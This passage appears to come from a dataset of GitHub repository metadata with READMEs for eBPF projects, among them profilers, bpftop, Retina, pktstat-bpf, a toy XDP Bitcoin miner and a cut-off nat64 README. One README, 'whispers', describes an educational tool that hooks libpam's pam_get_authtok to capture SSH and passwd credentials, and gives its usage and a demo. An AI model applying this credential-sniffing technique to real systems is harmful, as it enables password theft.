Follow [the Docker installation guide](https://docs.docker.com/engine/install/#supported-platforms) to build and run tests.

```bash
# Build and output the binary to ./bin
./gmon.sh build
# Build and install the binary to /usr/bin
./gmon.sh install
# Run tests
./gmon.sh test
```
"
elastic/otel-profiling-agent,2899,339,2899,66,Go,"The production-scale datacenter profiler (C/C++, Go, Rust, Python, Java, NodeJS, .NET, PHP, Ruby, Perl, ...)",2024-04-15T14:22:53Z,2025-10-10T09:04:57Z,519,"# Introduction

This repository implements a whole-system, cross-language profiler for Linux via
eBPF.

## Core features and strengths

- Implements the [experimental OTel profiling
  signal](https://github.com/open-telemetry/opentelemetry-proto/pull/534)
- Very low CPU and memory overhead (1% CPU and 250MB memory are our upper limits
  in testing and the agent typically manages to stay way below that)
- Support for native C/C++ executables without the need for DWARF debug
  information (by leveraging `.eh_frame` data as described in
  [US11604718B1](https://patents.google.com/patent/US11604718B1/en?inventor=thomas+dullien&oq=thomas+dullien))
- Support profiling of system libraries **without frame pointers** and **without
  debug symbols on the host**.
- Support for mixed stacktraces between runtimes - stacktraces go from Kernel
  space through unmodified system libraries all the way into high-level
  languages.
- Support for native code (C/C++, Rust, Zig, Go, etc. without debug symbols on
  host)
- Support for a broad set of HLLs (Hotspot JVM, Python, Ruby, PHP, Node.JS, V8,
  Perl), .NET is in preparation.
- 100% non-intrusive: there's no need to load agents or libraries into the
  processes that are being profiled.
- No need for any reconfiguration, instrumentation or restarts of HLL
  interpreters and VMs: the agent supports unwinding each of the supported
  languages in the default configuration.
- ARM64 support for all unwinders except NodeJS.
- Support for native `inline frames`, which provide insights into compiler
  optimizations and offer a higher precision of function call chains.

## Building

We are working towards integrating the profiling functionality into the [OTel Collector](https://opentelemetry.io/docs/collector/) as a receiver,
which will be the supported configuration going forward. In the meantime, we also offer a standalone profiling agent binary named `ebpf-profiler`,
to aid with development and debugging. The expectation is that this will go away once the integration with the [OTel Collector](https://opentelemetry.io/docs/collector/) is complete.

## Platform Requirements
The agent can be built with the provided make targets. Docker is required for containerized builds, and both amd64 and arm64 architectures are supported.

 For **Linux**, the following steps apply:
  1. Build the agent for your current machine's architecture:
     ```sh
     make agent
     ```
     Or `make debug-agent` for debug build.
  2. To cross-compile for a different architecture (e.g. arm64):
     ```sh
     make agent TARGET_ARCH=arm64
     ```
The resulting binary will be named `ebpf-profiler` in the current directory.

## Other OSes
Since the profiler is Linux-only, macOS and Windows users need to set up a Linux VM to build and run the agent. Ensure the appropriate architecture is specified if using cross-compilation. Use the same make targets as above after the Linux environment is configured in the VM.

## Supported Linux kernel version

[7ddc23ea](https://github.com/open-telemetry/opentelemetry-ebpf-profiler/commit/7ddc23ea135a2e00fffc17850ab90534e9b63108) is the last commit with support for 4.19. Changes after this commit may require a minimal Linux kernel version of 5.4.

## Alternative Build (Without Docker)
You can build the agent without Docker by directly installing the dependencies listed in the Dockerfile. Once dependencies are set up, simply run:
```sh
make
```
or
```sh
make debug
```
This will build the profiler natively on your machine.

## Running

You can start the agent with the following command:

```sh
sudo ./ebpf-profiler -collection-agent=127.0.0.1:11000 -disable-tls
```

The agent comes with a functional but work-in-progress / evolving implementation
of the recently released OTel profiling [signal](https://github.com/open-telemetry/opentelemetry-proto/pull/534).

The agent loads the eBPF program and its maps, starts unwinding and reports
captured traces to the backend.

## Development

To understand how this project works and learn more about profiling, check out [Profiling internals](doc/internals.md)


# Legal

## Licensing Information

This project is licensed under the Apache License 2.0 (Apache-2.0).
[Apache License 2.0](LICENSE)

The eBPF source code is licensed under the GPL 2.0 license.
[GPL 2.0](support/ebpf/LICENSE)

## Licenses of dependencies

To display a summary of the dependencies' licenses:
```sh
make legal
```
"
peter-mcconnell/whispers,11,1,11,0,Go,"A little libpam snooping binary, for a talk I'll be giving",2024-02-17T14:59:20Z,2025-02-24T00:07:11Z,32,"whispers
========

A binary that dumps credentials from libpam (as used by openssh, passwd and others). Written for a tech talk. Accompanying blog post: https://www.petermcconnell.com/posts/whispers/

[![asciicast](https://asciinema.org/a/641250.png)](https://asciinema.org/a/641250)

## Usage

```sh
Usage of ./bin/whispers:
  -binPath string
    	Path to the binary (default ""/lib/x86_64-linux-gnu/libpam.so.0"")
  -symbol string
    	Symbol to target (default ""pam_get_authtok"")
```


## Demo

Build a docker image with SSHD running and the whispers binary present

```sh
make docker-run
```

Now in a new terminal, ssh into the container we've just ran using port 2222:

```sh
ssh root@localhost -p 2222
```

Now in the previous terminal (where you ran `make docker-run`) exec into the container:

```sh
make docker-exec
```

And once inside the container, simply run `whispers`. Now repeat the ssh login in your other terminal
- whispers should dump out the credentials as you log in. Also try changing the password with `passwd`
and it should also capture this.


## Building

### Dependencies

- golang
- llvm
- clang
- libbpf-dev
- linux-tools-generic
- linux-headers
- make

### Build

Generate vmlinux.h:

```sh
make vmlinux
```

Build whispers

```sh
make whispers GOARCH=arm64  # or GOARCH=amd64
```


## Exploration

This repo was built for a talk on Golang and BPF. As such it is meant as an educational tool more than anything.
Given that, I'd encourage you to explore.

```sh
# run the docker image
make docker-run

# exec into the docker image
make docker-exec

# view linked libpam lib of sshd (/usr/sbin/sshd from inside the container)
ldd /usr/sbin/sshd | grep pam

# alteratively, exit the container and run ldd on the binary path on host:
docker inspect whispers -f '{{.GraphDriver.Data.MergedDir}}'
ldd <directory given from previous command>/usr/sbin/sshd | grep pam
# ^ if this seems interesting to you, check out https://www.petermcconnell.com/posts/docker-overlayfs/


# show auth symbols of libpam
readelf -Ws /lib/x86_64-linux-gnu/libpam.so.0 | grep auth

# manually list probe events
bpftrace -e 'uprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok { printf(""pam_get_authtok called\n""); }'
```

## Docker images

`docker pull pemcconnell/whispers-base:latest` - this is a simple docker image which contains the dependencies required to build whispers. It is used for CI

## Credits

 - I grabbed the libpam definitions from https://github.com/citronneur/pamspy
"
Netflix/bpftop,2555,120,2555,2,C,"bpftop provides a dynamic real-time view of running eBPF programs. It displays the average runtime, events per second, and estimated total CPU % for each program.",2024-02-10T22:20:51Z,2025-10-12T08:22:33Z,224,"# bpftop

<img src=""bpftop-logo.png"" width=""75"" height=""75"">

`bpftop` provides a dynamic real-time view of running eBPF programs. It displays the average runtime, events per second, and estimated total CPU % for each program. It also provides graphical views of these statistics over time. This tool minimizes overhead by enabling performance statistics only while it is active.

![bpftop](bpftop.gif)

## Installation

To download the latest x86_64 release of `bpftop`, use the following command:

```bash
curl -fLJ https://github.com/Netflix/bpftop/releases/latest/download/bpftop-x86_64-unknown-linux-gnu -o bpftop && chmod +x bpftop
```

or install via your distribution's package manager:

[![Packaging status](https://repology.org/badge/vertical-allrepos/bpftop.svg)](https://repology.org/project/bpftop/versions)

### Fedora

You can install `bpftop` from the [official repositories](https://src.fedoraproject.org/rpms/bpftop) using [dnf](https://dnf.readthedocs.io/en/latest/):

```bash
sudo dnf install bpftop
```

### Arch Linux

You can install `bpftop` from the [official repositories](https://packages.fedoraproject.org/pkgs/bpftop/bpftop/) using [pacman](https://wiki.archlinux.org/title/pacman):

```bash
sudo pacman -S bpftop
```

### Nix
You can install bpftop from the NixOS 24.11 stable channel:

```
nix-channel --add https://nixos.org/channels/nixos-24.11 nixpkgs
nix-channel --update
nix-env -iA nixpkgs.bpftop
```

## Features

- **Real-time monitoring**: Displays a list of all running eBPF programs with ID, type, and name
- **Performance metrics**: Shows period and total average runtime, events per second, and estimated CPU utilization
- **Interactive navigation**: Navigate using arrow keys (â†‘/â†“) or vim-style keys (j/k)
- **Time-series graphs**: Press Enter on a program to view graphical representations of performance metrics over time
- **Program filtering**: Press 'f' to filter programs by name or type
- **Column sorting**: Press 's' to sort by different columns (ascending/descending)
- **Process information**: Displays process names and PIDs that reference each eBPF program
- **Scrollbar navigation**: Automatically shows scrollbar when the program list exceeds terminal height
- **Customizable refresh rate**: Set update interval with `-d/--delay` option (1-3600 seconds)
- **Backward compatibility**: Supports Linux kernels from version 5.8+ (older kernels via procfs)
- **Minimal overhead**: Enables statistics gathering only while active, automatically disables on exit
- **Logging integration**: Logs to systemd journal when available

## Prerequisites

- `bpftop` requires `sudo` privileges to run.
- Linux kernel version 5.8 or later (older kernels supported via procfs fallback)
- The binary is dynamically linked to `libz` and `libelf`, so these libraries must be present on the systems where you intend to run `bpftop`.
- For logging functionality: systemd/journald (optional, will gracefully fallback if not available)

## Usage

Run the following command to start `bpftop` on your host:

```bash
sudo ./bpftop
```

### Command-line Options

- `-d, --delay <SECONDS>`: Set refresh interval (1-3600 seconds, default: 1)
- `-h, --help`: Show help information
- `-V, --version`: Show version information

Examples:
```bash
# Start with default 1-second refresh
sudo ./bpftop

# Update every 2 seconds
sudo ./bpftop -d 2

# Update every 5 seconds
sudo ./bpftop --delay 5
```

### Interactive Controls

Once running, use these keyboard shortcuts:

**Navigation:**
- `â†‘/â†“` or `k/j`: Navigate up/down through the program list
- `Enter`: Switch to graphical view for the selected program
- `q`: Quit the application

**Features:**
- `f`: Filter programs by name or type
- `s`: Sort programs by different columns (use arrow keys to select column and direction)

**In graph view:**
- `Enter` or `q`: Return to the main program list

### Viewing Process Information

When you select a program, `bpftop` displays additional information including:
- Process names and PIDs that reference the selected eBPF program
- Detailed performance metrics and graphs

### Logging

`bpftop` logs operational information to the systemd journal when available. You can view these logs using:

```bash
journalctl _COMM=bpftop
```

Common log entries include:
- Application startup and shutdown
- Kernel version information
- BPF statistics enablement status
- Error conditions and debugging information

## Relate links

* [Announcement blog post](https://netflixtechblog.com/announcing-bpftop-streamlining-ebpf-performance-optimization-6a727c1ae2e5)
* [LWN.net](https://lwn.net/Articles/963767/)
* [The New Stack](https://thenewstack.io/netflix-releases-bpftop-an-ebpf-based-application-monitor/)

## How it works

`bpftop` uses the [BPF_ENABLE_STATS](https://elixir.bootlin.com/linux/v6.6.16/source/include/uapi/linux/bpf.h#L792) BPF syscall command to enable global eBPF runtime statistics gathering, which is disabled by default to reduce performance overhead. It collects these statistics every second, calculating the average runtime, events per second, and estimated CPU utilization for each eBPF program within that sample period. This information is displayed in a top-like tabular format. Once `bpftop` terminates, it disables the statistics-gathering function by deleting the file descriptor returned by `BPF_ENABLE_STATS`.

## Building from source

### Prerequisites
Install required dependencies:
```bash
# Ubuntu/Debian
sudo apt-get install -y zlib1g-dev libelf-dev clang libbpf-dev

# Fedora/RHEL
sudo dnf install -y zlib-devel elfutils-libelf-devel clang libbpf-devel
```

### Build Instructions

**For native builds:**
```bash
# Development build
cargo build

# Release build
cargo build --release
```

**For cross-compilation:**
1. Install and setup [cross](https://github.com/cross-rs/cross):
   ```bash
   cargo install cross --git https://github.com/cross-rs/cross
   ```

2. Build for target architectures:
   ```bash
   # x86_64
   cross build --release --target x86_64-unknown-linux-gnu
   
   # ARM64
   cross build --release --target aarch64-unknown-linux-gnu
   ```

Note: Cross-compilation builds may take 15+ minutes on first run due to Docker image building.

## Troubleshooting

### Common Issues

**""This program must be run as root""**
- Ensure you're running with `sudo` privileges. eBPF statistics collection requires root access.

**No programs displayed**
- This is normal if no eBPF programs are currently loaded on your system
- Try loading an eBPF program (e.g., using `bpftrace`, `bcc-tools`, or other eBPF utilities) to see them in bpftop

**Terminal display issues**
- Ensure your terminal supports ANSI colors and has sufficient size
- Minimum recommended terminal size: 80x24 characters

**Missing libraries error**
- Install the required system dependencies: `libz` and `libelf`
- On Ubuntu/Debian: `sudo apt-get install zlib1g-dev libelf-dev`

### Logging and Debugging

View application logs:
```bash
# View all bpftop logs
journalctl _COMM=bpftop

# Follow logs in real-time
journalctl _COMM=bpftop -f

# View logs from last boot
journalctl _COMM=bpftop -b
```

The logs include information about:
- Application startup and shutdown
- Kernel compatibility checks
- BPF statistics enablement method used
- Any errors or warnings encountered
"
microsoft/retina,3047,259,3047,164,Go,eBPF distributed networking observability tool for Kubernetes,2024-01-23T01:31:59Z,2025-10-11T23:12:33Z,1029,"<h1 align=""center"">
  <picture>
    <source media=""(prefers-color-scheme: light)"" srcset=""site/static/img/Retina-logo-horizontal.png"">
    <img src=""site/static/img/Retina-logo-horizontal.png"" alt=""Retina Logo"" width=""30%"">
  </picture>
</h1>

[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://github.com/codespaces/new?hide_repo_select=true&ref=main&repo=746962176)

[![goreport][goreport-img]][goreport] ![GitHub release][release-img] [![retina-publish][godoc-badge]][godoc] ![license]

[![retina-test][retina-test-image-badge]][retina-test-image] [![retinash][retinash-badge]][retinash] [![retina-publish][retina-publish-badge]][retina-publish] ![retina-codeql-img][retina-codeql-badge] ![retina-golangci-lint-img][retina-golangci-lint-badge]

## Overview

Retina is a cloud-agnostic, open-source **Kubernetes network observability platform** that provides a **centralized hub for monitoring application health, network health, and security**. It provides actionable insights to cluster network administrators, cluster security administrators, and DevOps engineers navigating DevOps, SecOps, and compliance use cases.

Retina **collects customizable telemetry**, which can be exported to **multiple storage options** (such as Prometheus, Azure Monitor, and other vendors) and **visualized in a variety of ways** (like Grafana, Azure Log Analytics, and other vendors).

## Features

- **[eBPF](https://ebpf.io/what-is-ebpf#what-is-ebpf)-based** Network Observability platform for Kubernetes workloads.
- **On-Demand** and **Configurable**.
- Actionable, industry-standard **Prometheus metrics**.
- Streamlined **Packet Captures** for deep dives.
- **Cloud-agnostic**, supporting multiple OS (like Linux, Windows, Azure Linux).

## Why Retina?

Retina lets you **investigate network issues on-demand** and **continuously monitor your clusters**. For scenarios where Retina shines, see the intro docs [here](https://retina.sh/docs/Introduction/intro)

## Documentation

See [retina.sh](http://retina.sh) for documentation and examples.

## Capabilities

Retina has two major features:

- [Metrics](https://retina.sh/docs/Metrics/metrics-intro)
- [Captures](https://retina.sh/docs/Captures/overview)

### Metrics Quick Install Guide

Retina can be installed using the Helm chart from GHCR:

```bash
# Set the version to a specific version here or get latest version from GitHub API.
VERSION=$( curl -sL https://api.github.com/repos/microsoft/retina/releases/latest | jq -r .name)
helm upgrade --install retina oci://ghcr.io/microsoft/retina/charts/retina \
    --version $VERSION \
    --set image.tag=$VERSION \
    --set operator.tag=$VERSION \
    --set logLevel=info \
    --set enabledPlugin_linux=""\[dropreason\,packetforward\,linuxutil\,dns\]""
```

Set the `version` and image `tag` arguments to the desired version, if different.

After Helm install, follow the steps for setting up [Prometheus](https://retina.sh/docs/Installation/prometheus) and [Grafana](https://retina.sh/docs/Installation/grafana) to configure metrics collection and visualization.

### Captures Quick Start Guide

#### Captures via CLI

The preferred way to install the Retina CLI using [Krew](https://krew.sigs.k8s.io/).

```bash
kubectl krew install retina
```

Other installation options are documented in [CLI Installation](https://retina.sh/docs/Installation/CLI).

Verify installation:

```bash
$ kubectl retina
Retina is an eBPF distributed networking observability tool for Kubernetes.

Usage:
  kubectl-retina [command]

Available Commands:
  capture     Capture network traffic
  completion  Generate the autocompletion script for the specified shell
  config      Configure retina CLI
  help        Help about any command
  shell       [EXPERIMENTAL] Interactively debug a node or pod
  trace       Retrieve status or results from Retina
  version     Show version

Flags:
  -h, --help   help for kubectl-retina

Use ""kubectl-retina [command] --help"" for more information about a command.
```

To quickly start creating a capture:

```bash
kubectl retina capture create --pod-selectors <app=my-app>
```

For further CLI documentation, see [Capture with Retina CLI](https://retina.sh/docs/Captures/cli).

#### Captures via CRD

Install Retina using Helm:

```bash
VERSION=$( curl -sL https://api.github.com/repos/microsoft/retina/releases/latest | jq -r .name)
helm upgrade --install retina oci://ghcr.io/microsoft/retina/charts/retina \
    --version $VERSION \
    --set image.tag=$VERSION \
    --set operator.tag=$VERSION \
    --set image.pullPolicy=Always \
    --set logLevel=info \
    --set os.windows=true \
    --set operator.enabled=true \
    --set operator.enableRetinaEndpoint=true \
    --skip-crds \
    --set enabledPlugin_linux=""\[dropreason\,packetforward\,linuxutil\,dns\,packetparser\]""
```

Then follow steps in [Capture CRD](https://retina.sh/docs/Captures/overview/#option-2-capture-crd-custom-resource-definition) for documentation of the CRD and examples for setting up Captures.

## Contributing

This project welcomes contributions and suggestions. Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit <https://cla.opensource.microsoft.com>.

When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.

[Read more about how to begin contributing here.](https://retina.sh/docs/Contributing/overview)

### Verify signed images

Retina images published to GHCR are cryptographically signed. You can verify their provenance with [`sigstore/cosign`](https://github.com/sigstore/cosign):

```shell
REPO=microsoft/retina # or your repo
IMAGE=retina-operator # or other image to verify
# This can be replaced with another tag to verify, or with the image SHA256
LATEST_TAG=$(curl -s https://api.github.com/repos/microsoft/retina/releases | jq -r '.[0].name')
cosign verify ghcr.io/$REPO/$IMAGE:$LATEST_TAG --certificate-oidc-issuer https://token.actions.githubusercontent.com --certificate-identity-regexp=""https://github.com/$REPO"" -o text
```

### Office Hours and Community Meetings

We host a periodic open community meeting. [Find the details here.](https://retina.sh/docs/Contributing/overview#office-hours-and-community-meetings)

## Trademarks

This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft
trademarks or logos is subject to and must follow [Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).
Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
Any use of third-party trademarks or logos are subject to those third-party's policies.

## License

See the [LICENSE](LICENSE).

## Code of Conduct

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/). For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.

## Contact

For bugs or feature requests, open an [issue](https://github.com/microsoft/retina/issues).
For security or vulnerability concerns, see [SECURITY.md](SECURITY.md).
For other communication, contact the maintainers at <retina@microsoft.com>.

[goreport-img]: https://goreportcard.com/badge/github.com/microsoft/retina
[goreport]: https://goreportcard.com/report/github.com/microsoft/retina
[godoc]: https://godoc.org/github.com/microsoft/retina
[godoc-badge]: https://godoc.org/github.com/microsoft/retina?status.svg
[release-img]: https://img.shields.io/github/v/release/microsoft/retina.svg
[license]: https://img.shields.io/badge/license-MIT-blue?link=https%3A%2F%2Fgithub.com%2Fmicrosoft%2Fretina%2Fblob%2Fmain%2FLICENSE
[retina-test-image-badge]: https://github.com/microsoft/retina/actions/workflows/test.yaml/badge.svg?branch=main
[retina-test-image]: https://github.com/microsoft/retina/actions/workflows/test.yaml?query=branch%3Amain
[retinash-badge]: https://github.com/microsoft/retina/actions/workflows/docs.yaml/badge.svg?branch=main
[retinash]: https://retina.sh/
[retina-publish-badge]: https://github.com/microsoft/retina/actions/workflows/images.yaml/badge.svg?branch=main
[retina-publish]: https://github.com/microsoft/retina/actions/workflows/images.yaml?query=branch%3Amain
[retina-codeql-badge]: https://github.com/microsoft/retina/actions/workflows/codeql.yaml/badge.svg?branch=main
[retina-golangci-lint-badge]: https://github.com/microsoft/retina/actions/workflows/golangci-lint.yaml/badge.svg?branch=main
"
fomichev/xdp-btc-miner,2,0,2,0,C,,2023-04-25T17:15:32Z,2024-04-01T14:37:41Z,2,"# BPF XDP Bitcoin Miner

Thanks to the introduction of BPF loops and increased verifier complexity
limits we are now able to implement simple Bitcoin miner in XDP. The program
assumes hard-coded input format, runs main loop 16 times, and if the solution
is found, sends it back. Having more than 16 loop iterations is still
problematic; `bpf_loop` might be the way to go beyond this toy example.

# How to run?

```
make
./mine
```

The above will run a test around XDP program by feeding it a solved
block 123 with a `nounce` adjusted back by 15 iterations. That's
enough for the program to try them all and eventually find a
solution.

```
$ make -s check
cc test_sha256.c && ./a.out
ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad
85e655d6417a17953363376a624cde5c76e09589cac5f811cc4b32c1f20e533a
248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1
ok
cc test_mine.c && ./a.out
mine() = 15
00000000a3bbe4fd1da16a29dbdaba01cc35d6fc74ee17f794cf3aab94f7aaa0
ok
rm a.out

$ make -s
$ ./mine
returned XDP_TX and correct 4094077204 nonce
$ cat /sys/kernel/debug/tracing/trace_maker
            ...
            mine-216     [001] b..11     6.270270: bpf_trace_printk: found on 15th iteration
```

# How Bitcoin mining works?

Block header is 80 bytes that contain the following:

```
+---------+-----------------+----------------+------+------------+-------+
| Version | Prev Block Hash | TX Merkle Root | Time | Difficulty | Nonce |
+---------+-----------------+----------------+------+------------+-------+
```

Mining works by iterating `nonce` by one, calling sha256 over 80 bytes
of block header, then calling sha256 again over previous result. (I'm
simplifying here a lot because `nonce` is only 32 bits and it's
possible to exhaust all nonces without finding the block)

The resulting checksum is treated as a big number and if this big number
is less then the predefined difficulty (e.g. has a lot of leading zeroes),
we've mined a new block.

# SHA256

SHA256 is very naive and unoptimized version from the [Wikipedia
page](https://en.wikipedia.org/wiki/SHA-2).

There is a userspace test program that runs a bunch of test vectors from
https://csrc.nist.gov/csrc/media/publications/fips/180/2/archive/2002-08-01/documents/fips180-2withchangenotice.pdf
"
dkorunic/pktstat-bpf,123,7,123,0,C,"TC, XDP, KProbe and CGroup eBPF based simple Ethernet interface traffic monitor and reporting tool",2024-03-24T23:16:25Z,2025-10-02T06:49:32Z,122,"# pktstat-bpf

[![GitHub license](https://img.shields.io/github/license/dkorunic/pktstat-bpf)](https://github.com/dkorunic/pktstat-bpf/blob/master/LICENSE)
[![GitHub release](https://img.shields.io/github/release/dkorunic/pktstat-bpf)](https://github.com/dkorunic/pktstat-bpf/releases/latest)

![](gopher.png)

## About

pktstat-bpf is a simple replacement for ncurses/libpcap-based [pktstat](https://github.com/dleonard0/pktstat), using Linux eBPF ([extended Berkeley Packet Filter](https://prototype-kernel.readthedocs.io/en/latest/bpf/)) program, allowing packet statistics gathering even under **very high traffic volume** conditions, typically several million packets per second even on an average server. In this scenario (high volume, DoS attacks etc.) typically regular packet capture solutions start being unreliable due to increasing packet loss.

At the end of the execution program will display per-IP and per-protocol statistics sorted by per-connection bps, packets and (source-IP:port, destination-IP:port) tuples.

Program consists of the [eBPF code in C](bpf/counter.bpf.c) and the pure-Go userland Golang program that parses and outputs final IP/port/protocol/bitrate statistics. Go part of the program uses wonderful [cillium/ebpf](https://github.com/cilium/ebpf) library to load and run eBPF program, interfacing with eBPF map.

By default eBPF component uses **TC** (Traffic Control) eBPF hooks with TCX attaching requiring at minimum Linux kernel **v6.6** for both ingress and egress traffic statistics for TCP, UDP, ICMPv4 and ICMPv6. It can also switch to even faster [XDP](https://github.com/xdp-project/xdp-tutorial) (eXpress Data Path) hook but with a consequence of **losing egress statistics** since **XDP** works only in ingress path. XDP mode due to XDP program to network interface attaching calls requires at minimum Linux kernel **v5.9**. Some distributions might have backported XDP/TC patches (notable example is Red Hat Enterprise Linux kernel) and eBPF program might work on older kernels too (see requirements for more info).

Alternatively it can use **KProbes** to monitor TCP, UDP, ICMPv4 and ICMPv6 communication throughout all containers, K8s pods, translations and forwards and display process ID as well as process name and CGroup path, if the traffic was being sent or delivered to userspace application. KProbes traditionally work the slowest, being closest to the userspace -- but they bring sometimes useful process information. KProbes work also with much older Linux kernels as well, but the hard-dependancy is a [BTF-enabled](https://docs.ebpf.io/concepts/btf/) kernel. Program will make sure to resolve kernel-level CGroup IDs to CGroup paths (below `/sys/fs/cgroup`) by both processing `/sys/fs/cgroup` and getting kernel CGroup mkdir events from [custom eBPF code](bpf/cgroup.bpf.c).

In case that you need to monitor just a specific **CGroup**, it is possible as well and monitoring both ingress and egress traffic is supported. You can also monitor all traffic by attaching to the root CGroup (e.g. `/sys/fs/cgroup`). Process tracking is possible when using CGroups, but only for traffic where pktstat-bpf observed the socket creation.
![Demo](demo.gif)

## Talks

The author of this tool has given a few eBPF talks which can be seen below, together with [slides](https://dkorunic.net/pdf/Korunic_eBPF.pdf):

- Shorter eBPF features/capabilities/implementation overview (35 minutes):

[![DORS/CLUC 2025: eBPF](https://img.youtube.com/vi/m8dbesXHOU4/0.jpg)](https://youtu.be/m8dbesXHOU4)

- Longer dive into eBPF features/capabilities/implementation and security (~45 minutes, in Croatian language):

[![DEEP 2024: eBPF: Features, capabilities and implementation](https://img.youtube.com/vi/9mQ03Cpfq_g/0.jpg)](https://youtu.be/9mQ03Cpfq_g)

## Requirements

Hard requirement for eBPF program is Linux kernel **4.10** with BTF enabled and in such older kernels most likely only supported mode will be KProbes (RHEL/CentOS 8, Debian 10). From **5.9** kernel onwards (RHEL/CentOS 9, Debian 11, Ubuntu 20.04) XDP mode is supported. TC might even work on **5.14** (RHEL/CentOS 9) depending if the distribution has backported TC eBPF patches. In all recent distributions (RHEL/CentOS 9, Debian 12, Ubuntu 24.04), all eBPF modes are fully supported.

Loading eBPF program typically requires root privileges and in our specific case pointer arithmetics in eBPF code causes [eBPF verifier](https://docs.kernel.org/bpf/verifier.html) to explicitly deny non-root use. Kernel has to be with BTF enabled and some features require more recent kernels, as shown in the table below.

Typically BPF JIT (Just in Time compiler) should be enabled for best performance (and most Linux distributions have this enabled by default):

```shell
sysctl -w net.core.bpf_jit_enable=1
```

In case of XDP, not all NIC drivers support **Native XDP** (XDP program is loaded by NIC driver with XDP support as part of initial receive path and most common 10G drivers already support this) or even **Offloaded XDP** (XDP program loads directly on NIC with hardware XDP support and executes without using CPU), causing kernel to fallback on **Generic XDP** with reduced performance. Generic XDP does not require any special support from NIC drivers, but such XDP happens much later in the networking stack and in such case performance is more or less equivalent to TC hooks.

The following table maps features, requirements and expected performance for described modes:

| Capture type                                        | Ingress | Egress | Performance    | Process tracking                           | Kernel required | SmartNIC required |
| --------------------------------------------------- | ------- | ------ | -------------- | ------------------------------------------ | --------------- | ----------------- |
| Generic [PCAP](https://github.com/dkorunic/pktstat) | Yes     | Yes    | Low            | No                                         | Any             | No                |
| [AF_PACKET](https://github.com/dkorunic/pktstat)    | Yes     | Yes    | Medium         | No                                         | v2.2            | No                |
| KProbes                                             | Yes     | Yes    | Medium+        | **Yes** (command, process ID, CGroup path) | v4.10           | No                |
| CGroup (SKB)                                        | Yes     | Yes    | Medium+        | Partial (command, process ID)              | v4.10           | No                |
| TC (SchedACT)                                       | Yes     | Yes    | **High**       | No                                         | v6.6            | No                |
| XDP Generic                                         | Yes     | **No** | **High**       | No                                         | v5.9            | No                |
| XDP Native                                          | Yes     | **No** | **Very high**  | No                                         | v5.9            | No                |
| XDP Offloaded                                       | Yes     | **No** | **Wire speed** | No                                         | v5.9            | **Yes**           |

A list of XDP compatible drivers follows (and it is not necessarily up-to-date):

- [xdp-project XDP driver list](https://github.com/xdp-project/xdp-project/blob/master/areas/drivers/README.org)
- [IO Visor XDP driver list](https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md#xdp)

## Usage

```shell
NAME
  pktstat-bpf

FLAGS
  -?, --help               display help
  -j, --json               if true, output in JSON format
  -c, --cgroup STRING      the path to a CGroup V2 to measure statistics on
  -x, --xdp                if true, use XDP instead of TC (this disables egress statistics)
  -k, --kprobes            if true, use KProbes for per-proces TCP/UDP statistics
  -g, --tui                if true, enable TUI
      --version            display program version
  -i, --iface STRING       interface to read from (default: eth0)
      --xdp_mode STRING    XDP attach mode (auto, generic, native or offload; native and offload require NIC driver support) (default: auto)
  -r, --refresh DURATION   refresh interval in TUI (default: 1s)
  -t, --timeout DURATION   timeout for packet capture in CLI (default: 10m0s)
```

It is possible to specify interface with `--iface`.

Timeout `--timeout` will stop execution after a specified time, but it is also possible to interrupt program with Ctrl C, SIGTERM or SIGINT.

With `--tui` program will switch to a very simple TUI primarily for continous monitoring purpose. Use arrow keys to browse statistics table and keys 'q' or 'x' to exit.

With `--json` it is possible to get traffic statistics in JSON format.

With `--xdp` program will switch from TC eBPF mode to XDP eBPF mode, working in even more high-performance mode however this will disable all egress statistics. On program exit it is also possible to get an interface reset, so it is best to use this program inside of [screen](https://www.gnu.org/software/screen/) or [tmux](https://github.com/tmux/tmux).

Additionally it is possible to change XDP attach mode with `--xdp_mode` from `auto` (best-effort between native and generic) to `native` or `offload`, for NIC drivers that support XDP or even NICs that have hardware XDP support.

With `--kprobes` program will switch to Kprobe mode and track TCP and UDP traffic per process. Performance will be even more degraded compared to TC and XDP mode, but all per-process traffic will be visible, inside of all Cgroups, containers, K8s pods etc. Additional details such as process command name, process ID and Control Group will be shown as well.

With `--cgroup` parameter with path to the CGroup it is possible to measure ingress and egress traffic for a specific Control Group. Additional details such as process command name and process ID will be shown if available.

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=dkorunic/pktstat,dkorunic/pktstat-bpf&type=Date)](https://star-history.com/#dkorunic/pktstat&dkorunic/pktstat-bpf&Date)
"
aojea/nat64,31,1,31,1,C,NAT64 implementation for Kubernetes deployments (mainly),2024-02-18T15:29:36Z,2025-08-21T23:17:52Z,55,"# ARCHIVED: MOVED TO https://github.com/kubernetes-sigs/nat64

# nat64

NAT64 implementation for Kubernetes deployments (mainly)

Despite you can use [IPv6 only in Kubernetes since 2019](https://github.com/kubernetes/enhancements/pull/1139) the Internet is still far of having parity between both IPv4 and
IPv6 worlds. DNS64 and NAT64 are commonly used to solve this problem and Kubernetes is not different, on the contrary, thanks to its ""simple"" network principlies this model is easy to implement.


            +---------------------+         +---------------+
             |IPv6 network         |         |    IPv4       |
             |           |  +-------------+  |  network      |
             |           |--| Name server |--|               |
             |           |  | with DNS64  |  |  +----+       |
             |  +----+   |  +-------------+  |  | H2 |       |
